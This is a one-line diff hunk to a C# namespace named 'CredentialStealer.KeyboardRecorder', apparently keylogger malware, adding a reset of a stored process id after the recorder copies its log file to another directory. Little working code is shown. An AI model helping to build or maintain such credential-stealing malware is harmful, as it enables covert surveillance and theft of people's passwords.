@@ -180,6 +180,7 @@ namespace CredentialStealer.KeyboardRecorder
             {
                 CopyFileToOtherDirectory();
                 fileName = UpdateFileName(origFileName);
+                storedActivePid = 0;
             } 
         }
 
